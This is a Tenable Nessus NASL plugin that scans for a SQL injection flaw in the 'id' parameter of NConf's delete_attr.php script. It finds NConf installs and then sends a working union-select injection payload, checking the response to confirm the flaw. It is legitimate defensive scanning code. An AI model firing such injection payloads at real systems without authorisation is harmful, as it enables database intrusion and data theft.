#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(65721);
  script_version("$Revision: 1.1 $");
  script_cvs_date("$Date: 2013/03/28 19:56:43 $");

  script_bugtraq_id(58295);
  script_osvdb_id(90887);
  script_xref(name:"EDB-ID", value:"24564");

  script_name(english:"NConf delete_attr.php id Parameter SQL Injection");
  script_summary(english:"Attempts to inject SQL code via the 'id' parameter");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a PHP script that is affected by a SQL
injection vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of the NConf installed on the remote host is affected by a
SQL injection vulnerability because it fails to properly sanitize
user-supplied input to the 'id' parameter of the 'delete_attr.php'
script.  An attacker may be able to leverage this to manipulate data in
the back-end database or disclose arbitrary data. 

Note that the application is also reportedly affected by additional SQL
Injection vulnerabilities and multiple cross-site scripting
vulnerabilities as well as a path disclosure issue but Nessus has not
tested for these additional issues."
  );
  # http://packetstormsecurity.com/files/120628/Nconf-1.3-SQL-Injection-Cross-Site-Scripting.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ba30f5cf");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/03/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/03/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:nconf:nconf");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

if (thorough_tests)
  dirs = list_uniq(make_list("/nconf", cgi_dirs()));
else
  dirs = make_list(cgi_dirs());

install_dirs = make_list();
non_vuln = make_list();

# Check for NConf
foreach dir (dirs)
{
  res = http_send_recv3(
    method       : "GET",
    item         : dir + "/index.php",
    port         : port,
    exit_on_fail : TRUE
  );

  if (
    "<!-- Load nconf js" >< res[2] &&
    egrep(pattern:"<b>NConf v. (.+)", string:res[2])
  ) install_dirs = make_list(install_dirs, dir);
}

script = SCRIPT_NAME;

# Send attack payload
foreach dir (install_dirs)
{
  vuln = FALSE;
  time = unixtime();

  sqli = "-1%20union%20select%20" + time + ",0x" + hexstr(script) + "--";
  attack_str = dir + "/delete_attr.php?id=" + sqli;

  res2 = http_send_recv3(
    method       : "GET",
    item         : attack_str,
    port         : port,
    exit_on_fail : TRUE
  );
  if (
    "<h2 >WARNING</h2>" >< res2[2] &&
    "<b>" + script + "</b>&quot; items will lose" >< res2[2] &&
    "<b>" + time + "</b>&quot; attribute." >< res2[2]
  )
  {
    set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
    vuln = TRUE;
    body = strstr(res2[2], "<h2 >WARNING</h2>");
    pos = stridx(body, "?<br><br>");
    body = substr(body, 0, pos);

    snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
    if (report_verbosity > 0)
    {
      report =
        '\nNessus was able verify the issue exists using the following' +
        '\nrequest :'      +
        '\n' +
        '\n' + http_last_sent_request() +
        '\n';
      if (report_verbosity > 1)
      {
        report +=
          '\n' + 'This produced the following output :' +
          '\n' +
          '\n' + snip +
          '\n' + chomp(body) +
          '\n' + snip +
          '\n';
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
  }
  # Make a list of install locations where the exploit failed
  if (!vuln) non_vuln = make_list(non_vuln, build_url(qs:dir, port:port));
  if (!thorough_tests && vuln) break;
}

# Audit Trails
if (max_index(install_dirs) == 0)
  audit(AUDIT_WEB_APP_NOT_INST, "NConf", port);

installs = max_index(non_vuln);
if (installs > 0)
{
  if (installs == 1)
    audit(AUDIT_WEB_APP_NOT_AFFECTED, "NConf", non_vuln[0]);
  else exit(0, "The NConf installs at " + join(non_vuln, sep:", ") +
    " are not affected.");
}
